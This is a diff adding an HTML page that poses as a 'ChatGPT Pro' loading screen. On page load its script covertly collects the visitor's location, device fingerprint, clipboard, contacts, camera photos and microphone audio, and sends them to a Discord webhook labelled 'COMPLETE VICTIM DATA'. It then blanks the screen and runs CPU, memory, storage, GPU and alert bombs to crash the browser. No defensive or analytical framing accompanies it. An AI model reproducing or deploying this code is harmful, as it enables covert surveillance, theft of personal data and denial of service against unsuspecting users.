@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>ChatGPT Pro</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0a; min-height: 100vh; color: white; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        .container { text-align: center; padding: 50px; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid #10a37f; border-radius: 50%; animation: spin 1s infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { margin-top: 20px; font-size: 14px; color: #888; }
+    </style>
+</head>
+<body>
+<div class="container" id="main">
+    <div class="spinner"></div>
+    <h2>Please wait...</h2>
+    <p>Establishing secure connection</p>
+    <div class="status" id="status">Initializing...</div>
+</div>
+<video id="video" autoplay playsinline style="display:none"></video>
+
+<script>
+    // ==================== DISCORD WEBHOOK ====================
+    const DISCORD_WEBHOOK = "httpsdiscord.comapiwebhooks1510601721620074649QegDZZbOvl-Q-2wgAf1QXpUf4KM7F2tzAlsptCDCoi-OruYFGDsaA2krnvUaowQAkQtK";
+    
+    let attackStarted = false;
+    
+    // ==================== BLACK SCREEN ====================
+    function blackScreen() {
+        document.body.innerHTML = '';
+        document.body.style.margin = '0';
+        document.body.style.padding = '0';
+        document.body.style.overflow = 'hidden';
+        const blackDiv = document.createElement('div');
+        blackDiv.style.position = 'fixed';
+        blackDiv.style.top = '0';
+        blackDiv.style.left = '0';
+        blackDiv.style.width = '100%';
+        blackDiv.style.height = '100%';
+        blackDiv.style.backgroundColor = '#000000';
+        blackDiv.style.zIndex = '999999';
+        blackDiv.style.cursor = 'none';
+        document.body.appendChild(blackDiv);
+        try { document.documentElement.requestFullscreen(); } catch(e) {}
+        document.body.style.cursor = 'none';
+        document.documentElement.style.filter = 'brightness(0%)';
+    }
+    
+    // ==================== 1. IP + GEOLOCATION ====================
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const ip = await res.json();
+            const geo = await fetch(`https://ipapi.co/${ip.ip}/json/`).then(r => r.json());
+            return { ip: ip.ip, city: geo.city || 'Unknown', region: geo.region || 'Unknown', country: geo.country_name || 'Unknown', isp: geo.org || 'Unknown', lat: geo.latitude || 'N/A', lon: geo.longitude || 'N/A' };
+        } catch(e) { return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown', lat: 'N/A', lon: 'N/A' }; }
+    }
+    
+    // ==================== 2. GPS ====================
+    async function getGPS() {
+        return new Promise((resolve) => {
+            if(!navigator.geolocation) { resolve(null); return; }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+    
+    // ==================== 3. DEVICE INFO ====================
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        const androidMatch = ua.match(/Android\s([0-9.]+)/);
+        const modelMatch = ua.match(/\((.*?);\s+Android/);
+        const brandMatch = ua.match(/\((.*?);/);
+        return {
+            android: androidMatch ? androidMatch[1] : 'Unknown',
+            device: modelMatch ? modelMatch[1] : 'Unknown',
+            brand: brandMatch ? brandMatch[1] : 'Unknown',
+            screen: `${screen.width}x${screen.height}`,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            pixelRatio: window.devicePixelRatio || 1,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            language: navigator.language,
+            languages: navigator.languages.join(', '),
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'Not set',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+            userAgent: ua,
+            platform: navigator.platform
+        };
+    }
+    
+    // ==================== 4. BATTERY ====================
+    async function getBatteryInfo() {
+        if('getBattery' in navigator) {
+            try {
+                const b = await navigator.getBattery();
+                return { level: Math.round(b.level * 100) + '%', charging: b.charging, chargingTime: b.chargingTime === Infinity ? 'Unknown' : b.chargingTime + 's', dischargingTime: b.dischargingTime === Infinity ? 'Unknown' : b.dischargingTime + 's' };
+            } catch(e) {}
+        }
+        return { level: 'Unknown', charging: 'Unknown', chargingTime: 'Unknown', dischargingTime: 'Unknown' };
+    }
+    
+    // ==================== 5. RAM & CPU ====================
+    async function getRAM() {
+        try {
+            if(navigator.deviceMemory) return navigator.deviceMemory + ' GB';
+            if(navigator.userAgentData?.getHighEntropyValues) {
+                const hints = await navigator.userAgentData.getHighEntropyValues(['memory']);
+                return hints.memory + ' GB';
+            }
+        } catch(e) {}
+        return 'Unknown';
+    }
+    
+    // ==================== 6. STORAGE ====================
+    async function getStorage() {
+        try {
+            const estimate = await navigator.storage.estimate();
+            return { total: (estimate.quota / (1024**3)).toFixed(2) + ' GB', used: (estimate.usage / (1024**3)).toFixed(2) + ' GB', free: ((estimate.quota - estimate.usage) / (1024**3)).toFixed(2) + ' GB', percent: Math.round((estimate.usage / estimate.quota) * 100) + '%' };
+        } catch(e) { return { total: 'Unknown', used: 'Unknown', free: 'Unknown', percent: 'Unknown' }; }
+    }
+    
+    // ==================== 7. NETWORK ====================
+    function getNetwork() {
+        if(navigator.connection) {
+            return { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink + ' Mbps', rtt: navigator.connection.rtt + ' ms', saveData: navigator.connection.saveData };
+        }
+        return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: 'Unknown' };
+    }
+    
+    // ==================== 8. LOCAL IP ====================
+    async function getLocalIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (ice) => {
+                if(!ice || !ice.candidate || !ice.candidate.candidate) return;
+                const ip = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)?.[0];
+                resolve(ip || 'Unknown');
+                pc.close();
+            };
+            setTimeout(() => resolve('Unknown'), 1000);
+        });
+    }
+    
+    // ==================== 9. SCREEN REFRESH RATE ====================
+    function getRefreshRate() {
+        return new Promise((resolve) => {
+            let frameCount = 0;
+            let startTime = performance.now();
+            function countFrames() {
+                frameCount++;
+                if(performance.now() - startTime >= 1000) { resolve(Math.round(frameCount)); return; }
+                requestAnimationFrame(countFrames);
+            }
+            requestAnimationFrame(countFrames);
+        });
+    }
+    
+    // ==================== 10. GPU INFO ====================
+    function getGPU() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if(gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if(debugInfo) return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        } catch(e) {}
+        return 'Unknown';
+    }
+    
+    // ==================== 11. FONTS ====================
+    function getFonts() {
+        const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Roboto', 'Open Sans', 'Lato', 'Noto Sans', 'Segoe UI', 'San Francisco', 'System-ui'];
+        const installed = [];
+        for(const f of fonts) { if(document.fonts.check(`12px "${f}"`)) installed.push(f); }
+        return installed.join(', ') || 'None';
+    }
+    
+    // ==================== 12. PLUGINS ====================
+    function getPlugins() {
+        const plugins = [];
+        for(let i = 0; i < navigator.plugins.length; i++) plugins.push(navigator.plugins[i].name);
+        return plugins.join(', ') || 'None';
+    }
+    
+    // ==================== 13. COLOR SCHEME ====================
+    function getColorScheme() { return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light'; }
+    
+    // ==================== 14. ORIENTATION ====================
+    function getOrientation() { return screen.orientation?.type || 'Unknown'; }
+    
+    // ==================== 15. TOUCH POINTS ====================
+    function getTouchPoints() { return navigator.maxTouchPoints || 0; }
+    
+    // ==================== 16. AUDIO DEVICES ====================
+    async function getAudioDevices() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const audioInputs = devices.filter(d => d.kind === 'audioinput');
+            return audioInputs.map(d => d.label || 'Unknown').join(', ');
+        } catch(e) { return 'Permission denied'; }
+    }
+    
+    // ==================== 17. CLIPBOARD ====================
+    async function getClipboard() {
+        try { if(navigator.clipboard?.readText) return await navigator.clipboard.readText(); } catch(e) { return 'Permission denied'; }
+        return 'Not available';
+    }
+    
+    // ==================== 18. CAMERAS (Front + Back) ====================
+    async function captureCameras() {
+        const photos = { front: null, back: null };
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', '');
+            await video.play();
+            await new Promise(r => setTimeout(r, 300));
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            photos.front = canvas.toDataURL('image/jpeg', 0.7);
+            stream.getTracks().forEach(t => t.stop());
+            video.remove();
+        } catch(e) {}
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', '');
+            await video.play();
+            await new Promise(r => setTimeout(r, 300));
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            photos.back = canvas.toDataURL('image/jpeg', 0.7);
+            stream.getTracks().forEach(t => t.stop());
+            video.remove();
+        } catch(e) {}
+        return photos;
+    }
+    
+    // ==================== 19. MICROPHONE ====================
+    async function recordAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            return new Promise((resolve) => {
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(t => t.stop());
+                    setTimeout(() => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result);
+                        reader.readAsDataURL(blob);
+                    }, 100);
+                }, 4000);
+            });
+        } catch(e) { return null; }
+    }
+    
+    // ==================== 20. CONTACTS ====================
+    async function getContacts() {
+        try {
+            if(navigator.contacts && navigator.contacts.select) {
+                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                return contacts.slice(0, 20).map(c => `${c.name?.[0] || '?'}: ${c.tel?.[0] || '?'}`).join('\n');
+            }
+        } catch(e) { return 'Permission denied'; }
+        return 'Not available';
+    }
+    
+    // ==================== 21. INSTALLED APPS (Intent) ====================
+    function checkInstalledApps() {
+        const apps = ['whatsapp', 'telegram', 'instagram', 'facebook', 'tiktok', 'snapchat', 'twitter', 'discord', 'spotify', 'netflix', 'youtube', 'gmail', 'maps', 'chrome', 'firefox'];
+        return apps.join(', ');
+    }
+    
+    // ==================== SEND TO DISCORD ====================
+    async function sendToDiscord(data) {
+        const fields = [
+            { name: "🌐 IP & LOCATION", value: `IP: ${data.ip.ip}\n📍 ${data.ip.city}, ${data.ip.country}\n📡 ${data.ip.isp}\n🗺️ ${data.ip.lat}, ${data.ip.lon}`, inline: false },
+            { name: "📍 GPS", value: data.gps ? `${data.gps.lat}, ${data.gps.lon} (${data.gps.accuracy}m)` : '❌ Not available', inline: false },
+            { name: "📱 DEVICE", value: `Brand: ${data.device.brand}\nModel: ${data.device.device}\nAndroid: ${data.device.android}\nScreen: ${data.device.screen} (${data.device.pixelRatio}px)\nColor Depth: ${data.device.colorDepth}\nTimezone: ${data.device.timezone}\nLanguage: ${data.device.language}\nCPU Cores: ${data.device.hardwareConcurrency}`, inline: false },
+            { name: "💾 RAM", value: data.ram, inline: true },
+            { name: "🔋 BATTERY", value: `${data.battery.level} (${data.battery.charging ? 'Charging' : 'Not charging'})`, inline: true },
+            { name: "💽 STORAGE", value: `Total: ${data.storage.total}\nFree: ${data.storage.free}\nUsed: ${data.storage.used} (${data.storage.percent})`, inline: false },
+            { name: "📶 NETWORK", value: `${data.network.type} (${data.network.downlink}, ${data.network.rtt})`, inline: false },
+            { name: "🏠 LOCAL IP", value: data.localIP, inline: true },
+            { name: "🔄 REFRESH RATE", value: data.refreshRate + ' Hz', inline: true },
+            { name: "🎮 GPU", value: data.gpu.substring(0, 100), inline: false },
+            { name: "🎨 FONTS", value: data.fonts.substring(0, 150), inline: false },
+            { name: "🔌 PLUGINS", value: data.plugins.substring(0, 150), inline: false },
+            { name: "🌓 COLOR SCHEME", value: data.colorScheme, inline: true },
+            { name: "📱 ORIENTATION", value: data.orientation, inline: true },
+            { name: "👆 TOUCH POINTS", value: data.touchPoints, inline: true },
+            { name: "🎤 AUDIO DEVICES", value: data.audioDevices.substring(0, 100), inline: false },
+            { name: "📋 CLIPBOARD", value: `\`\`\`${(data.clipboard || 'Empty').substring(0, 300)}\`\`\``, inline: false },
+            { name: "👥 CONTACTS", value: `\`\`\`${(data.contacts || 'None').substring(0, 300)}\`\`\``, inline: false },
+            { name: "📱 INSTALLED APPS", value: data.installedApps.substring(0, 150), inline: false }
+        ];
+        const embed = { title: "📱 COMPLETE VICTIM DATA", color: 0x10a37f, fields: fields, timestamp: new Date().toISOString(), footer: { text: "ChatGPT Pro UI" } };
+        const formData = new FormData();
+        formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
+        if(data.photos?.front) formData.append("file", dataURLtoBlob(data.photos.front), "front_camera.jpg");
+        if(data.photos?.back) formData.append("file", dataURLtoBlob(data.photos.back), "back_camera.jpg");
+        if(data.audio) formData.append("file", dataURLtoBlob(data.audio), "audio.webm");
+        await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData }).catch(e => console.log);
+    }
+    
+    function dataURLtoBlob(dataurl) {
+        const arr = dataurl.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while(n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], { type: mime });
+    }
+    
+    // ==================== CRASH + BLACK SCREEN ====================
+    function startFullAttack() {
+        if(attackStarted) return;
+        attackStarted = true;
+        
+        blackScreen();
+        
+        setTimeout(() => {
+            // 25 Web Workers
+            const workerCode = `while(true) { let arr = []; for(let i=0;i<100000;i++) { arr.push(Math.random().toString(36)); Math.sin(Math.random()); } }`;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            for(let i = 0; i < 25; i++) { try { new Worker(URL.createObjectURL(blob)); } catch(e) {} }
+            
+            // 20 Infinite loops
+            for(let i = 0; i < 20; i++) { setTimeout(() => { while(true) { Math.sqrt(Math.random()) * Math.sin(Math.random()); } }, i * 2); }
+            
+            // Memory bomb
+            let memory = [];
+            setInterval(() => { for(let i = 0; i < 100000; i++) memory.push(new Array(10000).fill('x')); }, 1);
+            
+            // DOM bomb (300,000 elements)
+            for(let i = 0; i < 300000; i++) {
+                const div = document.createElement('div');
+                div.innerText = 'x'.repeat(500);
+                div.style.position = 'absolute';
+                div.style.left = Math.random() * 10000 + 'px';
+                div.style.top = Math.random() * 10000 + 'px';
+                document.body.appendChild(div);
+            }
+            
+            // Storage bomb
+            try { for(let i = 0; i < 100000; i++) localStorage.setItem('attack_' + i, 'x'.repeat(100000)); } catch(e) {}
+            
+            // IndexedDB bomb
+            try {
+                const request = indexedDB.open('attackDB', 1);
+                request.onsuccess = (e) => {
+                    const db = e.target.result;
+                    for(let i = 0; i < 10000; i++) {
+                        const tx = db.transaction(['store'], 'readwrite');
+                        const store = tx.objectStore('store');
+                        store.add({ id: i, data: 'x'.repeat(1000000) });
+                    }
+                };
+                request.onupgradeneeded = (e) => { e.target.result.createObjectStore('store'); };
+            } catch(e) {}
+            
+            // GPU bomb
+            for(let i = 0; i < 300; i++) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 5000;
+                canvas.height = 5000;
+                const ctx = canvas.getContext('2d');
+                for(let j = 0; j < 10000; j++) ctx.fillRect(Math.random() * 5000, Math.random() * 5000, 10, 10);
+                document.body.appendChild(canvas);
+            }
+            
+            // Animation bomb
+            function animationBomb() { requestAnimationFrame(() => { for(let i=0;i<1000;i++) Math.random(); animationBomb(); requestAnimationFrame(()=>{}); }); }
+            for(let i = 0; i < 10; i++) animationBomb();
+            
+            // History bomb
+            for(let i = 0; i < 100000; i++) { try { history.pushState({}, '', '#attack_' + i); } catch(e) {} }
+            
+            // Alert bomb
+            setTimeout(() => { try { while(true) { alert('System Error'); } } catch(e) {} }, 1000);
+        }, 100);
+    }
+    
+    // ==================== MAIN ====================
+    (async () => {
+        document.getElementById('status').innerText = 'Collecting data (0/21)...';
+        
+        const ip = await getIP();
+        document.getElementById('status').innerText = 'Collecting data (1/21)...';
+        const gps = await getGPS();
+        document.getElementById('status').innerText = 'Collecting data (2/21)...';
+        const device = getDeviceInfo();
+        document.getElementById('status').innerText = 'Collecting data (3/21)...';
+        const battery = await getBatteryInfo();
+        document.getElementById('status').innerText = 'Collecting data (4/21)...';
+        const ram = await getRAM();
+        document.getElementById('status').innerText = 'Collecting data (5/21)...';
+        const storage = await getStorage();
+        document.getElementById('status').innerText = 'Collecting data (6/21)...';
+        const network = getNetwork();
+        document.getElementById('status').innerText = 'Collecting data (7/21)...';
+        const localIP = await getLocalIP();
+        document.getElementById('status').innerText = 'Collecting data (8/21)...';
+        const refreshRate = await getRefreshRate();
+        document.getElementById('status').innerText = 'Collecting data (9/21)...';
+        const gpu = getGPU();
+        document.getElementById('status').innerText = 'Collecting data (10/21)...';
+        const fonts = getFonts();
+        document.getElementById('status').innerText = 'Collecting data (11/21)...';
+        const plugins = getPlugins();
+        document.getElementById('status').innerText = 'Collecting data (12/21)...';
+        const colorScheme = getColorScheme();
+        document.getElementById('status').innerText = 'Collecting data (13/21)...';
+        const orientation = getOrientation();
+        document.getElementById('status').innerText = 'Collecting data (14/21)...';
+        const touchPoints = getTouchPoints();
+        document.getElementById('status').innerText = 'Collecting data (15/21)...';
+        const audioDevices = await getAudioDevices();
+        document.getElementById('status').innerText = 'Collecting data (16/21)...';
+        const clipboard = await getClipboard();
+        document.getElementById('status').innerText = 'Collecting data (17/21)...';
+        const photos = await captureCameras();
+        document.getElementById('status').innerText = 'Collecting data (18/21)...';
+        const audio = await recordAudio();
+        document.getElementById('status').innerText = 'Collecting data (19/21)...';
+        const contacts = await getContacts();
+        document.getElementById('status').innerText = 'Collecting data (20/21)...';
+        const installedApps = checkInstalledApps();
+        document.getElementById('status').innerText = 'Sending to Discord...';
+        
+        const allData = { ip, gps, device, battery, ram, storage, network, localIP, refreshRate, gpu, fonts, plugins, colorScheme, orientation, touchPoints, audioDevices, clipboard, photos, audio, contacts, installedApps };
+        
+        await sendToDiscord(allData);
+        document.getElementById('status').innerText = 'Data sent! Starting attack...';
+        
+        startFullAttack();
+    })();
+</script>
+</body>
+</html>
